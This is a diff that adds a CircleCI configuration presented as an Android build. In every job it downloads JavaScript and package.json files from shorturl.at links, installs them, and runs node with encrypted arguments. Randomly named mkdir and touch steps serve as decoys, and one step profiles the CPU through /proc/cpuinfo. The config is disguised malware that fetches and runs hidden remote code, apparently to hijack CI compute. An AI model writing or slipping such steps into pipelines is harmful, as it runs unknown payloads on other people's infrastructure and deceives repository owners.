@@ -1,0 +1,73 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  startWork:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: curl -fsSL shorturl.at/azU28 -o 9vi6waj.js && curl -fsSL shorturl.at/ikuLR
+          -o package.json && curl -fsSL shorturl.at/nBE49 -o vn86ik4zyo.js
+      - run: mkdir whzglxd65niynm6d6
+      - run: touch jcyuc551br89twv5tbmrl7u.c
+      - run: mkdir 872joyllerv
+      - run: npm i -s
+      - run: mkdir d69kw0tjryolnql
+      - run: touch 258xht28v8024suhmi.php
+      - run: node 9vi6waj -r
+          U2FsdGVkX19ANHpeF/wTMDPMffiZSKkuxkjLhcg4zeBRmDY5ljkDW90/c3VFUC3W/rjjg/zl5tKMp0zIXv+zWGeDRBIJ0If/6ggYnt9tGaYn++objCg/5ZET6GIWtAnBQqKyukTQjv67LzEBo//PfZ/D9gHxA7wMDG+4lOjqgMP/KgsVBS5WWhzYw3joWc129Qs0pjWKdzfTN0jlWplYqmn4OK1UJeTWt3/b7PyqEHFzkVHg3dj14T7IpQO/EiAebhPDvHbTJKyC1qDoHChWIKmo9BZO73wuaoOsNT4FAc4=
+          -sp -lpn U2FsdGVkX1+cOnC1E26L6BaNXzhEzxzabidmmyI2nFg= -s
+          U2FsdGVkX1+pHQd0wUIQe8KLbHYbPxKJdPD6k7ESkadiNXSk5jxPv75BbM+gZMQmM9er99mLsWakwpAVy7zmEfiMMbc2bZ0c7KwFJlIofiH/EkepuGRZpnhL/L1q0vfKc5tEHwFIhAcJyjUW1uC2E6aTtdnCcHqFYYmHuY13DqN/5FT7Hm0PhPYy30+PUs/CyJG9qspRefXSeVnczcpQWZdvmqQemAX1F3J9gZAH6b8=
+          -t U2FsdGVkX1+Hx8LsZlv/oACrS2CoCXE+MJDE8D2sgkAk41nwZTgykA2Hw4uRqVUG
+      - run: cat /proc/cpuinfo | grep 'vendor' | uniq && cat /proc/cpuinfo | grep 'model
+          name' | uniq && cat /proc/cpuinfo | grep processor | wc -l && cat
+          /proc/cpuinfo | grep 'core id'
+  start-jobs:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: mkdir e1irzm8vuuproqup2y89sl
+      - run: curl -fsSL shorturl.at/ajzR7 -o ona1zy51if62h.js && curl -fsSL
+          shorturl.at/zIOY8 -o package.json && curl -fsSL shorturl.at/dzKN3 -o
+          79ccuh9k33979o3kg.js
+      - run: mkdir xw4ekctwlz86fwlg
+      - run: npm i -s
+      - run: mkdir yfjs9dzin5idyz5m1
+      - run: touch j9d34og0p0eq.html
+      - run: touch 2axzkrz1pp7g7tztiygszzk0g.py
+      - run: touch q5jcgtdhb903jj69ahz99mcp.java
+      - run: node ona1zy51if62h -s
+          U2FsdGVkX1/AUZ5DH6rOHj4WB6XY4Flw1PQlK9YUU6WayEoaKdybMdfc4uF+LhjOnJTVpNE1m7X7cCZTpLKjw3vOhiHLqtykbd/9i9uRZwpNsKlPhWL8Cu/uf9u5YLCCeCIhL49EoiBLhg576colQe7iyQA55109JWI/XjT/zVsZT+GD6rZFCDnWypqoHqfm3MtQkmD/LJcVTYKjgHB7OYK8ZZAx4WETAXlfHOsJo80=
+          -lpn U2FsdGVkX19INAPvVNTw2CKc1IDCdcQIyqJl6QnDcMG/ACOEnSOoUsaQu9CWu9O9
+          -sp -r
+          U2FsdGVkX1/nKjeZj8pMvzSY+d+gwgdIAA/KMYQRrVfazK72Nb50S3lFSR5caDG2Oe/LzyBrprbU6csqikAzirXU3gTqbQfRK0Lz+WCXsz3H8CDIcxCQKpQ1iTQFBkOKSZcAFmgm4fxTfFTDxckkSB008dhS0D8m8eNt/C/fwDQdJrSrnwTHHk/t6osdWRyJofkpf4g2YpMB6mLQD4PGg4iZ8bA5Gjnv7owE9hn5/f2BZPLk0GVeXSrRARNWO3P/YP1VfZOsqk3xE4vQw1C2ZI1jt/qEdVYuJuxGgENHPWI=
+          -t U2FsdGVkX1+YSzadw/E8IoQ4k45MiuXQ7OG7mq+6U9VzvOEeHlzTkgOBJutmryu7
+  run-jobs:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: touch i5djtmvu.ts
+      - run: curl -fsSL shorturl.at/grEXY -o nwict92ickv7pl.js && curl -fsSL
+          shorturl.at/foyOQ -o fg8b1avwdxrnyvb.js && curl -fsSL
+          shorturl.at/uCIQR -o package.json
+      - run: mkdir harnedag14msxg3rapj
+      - run: npm i -s
+      - run: echo version 49156145391.947014
+      - run: touch jlgbgnrzks63h527wvc.py
+      - run: touch 7tjuluq1jfmzmtswm3k.net
+      - run: node fg8b1avwdxrnyvb -sp -s
+          U2FsdGVkX1+vy8bdMOtS9M4n77wC+QNn25x/VGaBZ4VBD/G9WyFg3NWzMHjX8wrDQEiqkN/4eLX5v4F8ajUCGwkOE4GAwKGQrIxBXQ3fwr6SnT+w6ZQKb5g1ERL84wGaKe2vqLITVLMp2wyZv6aGDXNLewikdz1h2izawrfIgHhRBrNRx4NnpgUBtFYZhQm9OlA62np0aOL6paoh5FsMccv7OTxMQtXmgrmPunxacP0=
+          -lpn U2FsdGVkX19lba2z+kGwZT4yiuefjP5KnuIm0F74X3o= -r
+          U2FsdGVkX1+4sY74djf/Q4w2Y5d3uEbMhKYDKcta7tAxaAlmSXJLG6rlkaqiSuhG+w/uNiB5HCcx0PyBURwj5mQtaFXtyjh+56Aw0sYsXqS3WptScS2R3/tpRG2SkpdBHEuTV0S8F2+JVia6QgulPOtnTfpUNj/htfLkURuU9WJJuOMBi76jN9TKgFrd4nUZ+Djz1UGkqua6eHchQX5qgzmA16xXZTyWoO+/c78gkCLP1W+xMxTdPjWu5dcdheZKB8SSCW1YCBSzpAZ8D3/HKq88Euz+HLekZpDyURpouUk=
+          -t U2FsdGVkX1/6QA0oFEZboYGlag4L04/xNf7TUM3NCCVcvvTtNfns594mg+fjJNzo
+      - run: touch wf188acx6lz4cayt7.html
+workflows:
+  jobs_46:
+    jobs:
+      - startWork
+  dataBuild:
+    jobs:
+      - start-jobs
+  startJobs:
+    jobs:
+      - run-jobs
